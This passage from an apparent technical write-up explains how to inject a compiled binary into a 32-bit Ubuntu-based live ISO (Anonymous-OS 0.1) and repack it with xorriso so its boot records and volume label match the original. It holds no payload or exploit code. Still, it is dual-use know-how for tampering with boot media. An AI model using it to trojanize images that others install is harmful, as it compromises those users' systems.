Anonymous-OS 0.1 has a contested history. It was called fake and trojan-laden by the Anonymous Twitter account, taken offline by SourceForge over security concerns, and described by Ars Technica as "nothing more than a snapshot of a system running Ubuntu 11.10 with a few minor tweaks." I used it here because the injection technique is what the write-up is about, not the reputation of the base media. The same procedure works on any single-squashfs Casper ISO, and the parts that change are the ones I listed above: the squashfs path, the boot arguments, the init system, and the architecture.

The architecture point is worth repeating because it is the part that tripped me up. The base is 32-bit i386. An x86_64 ELF will copy in cleanly, set the permissions correctly, and then never run. The `file` output is the check: it must say `ELF 32-bit LSB executable, Intel 80386`. If it says `ELF 64-bit`, the binary is wrong for this ISO and no amount of repacking will fix it. The fix is to recompile, not to repack. On a modern Kali host, the native `-m32` path conflicts with the ARM cross-compilers, so the i686 cross-compiler is the clean way to produce the correct binary.

The El Torito report for this ISO is the exact rebuild recipe. It is four lines: volume label, modification date, boot catalog path, and boot image path, followed by the three standard ISOLINUX flags. There is no hybrid MBR, no GPT, no appended EFI partition, and no UEFI entry. The rebuild reproduced those four lines and the three flags exactly, and the diff against the original report confirmed it. The only differences were the input filename, the data block count (which changed by 9 blocks because the repacked squashfs has a different size), and the free-space figure. The boot structure was identical.

The two `-volid` warnings during the build are inherent to the original label, not to the modification. The label `Anonymous-OS Live` contains a dash and a space, which are outside the strict ISO 9660 level 1 character set. The original ISO shipped with the same label and the same warnings would have appeared if it had been rebuilt with `xorriso`. Sanitizing the label would change the volume ID from the original, which the boot process and Casper use to find the media. I left it alone.

For more advanced automation, consider using `live-build` or `livecd-rootfs`, which are Canonical's official tools for building Ubuntu images. For a 2012-era ISO, the manual `xorriso` rebuild is the most direct path, and the `-report_el_torito as_mkisofs` output is the only authoritative source for the boot arguments.
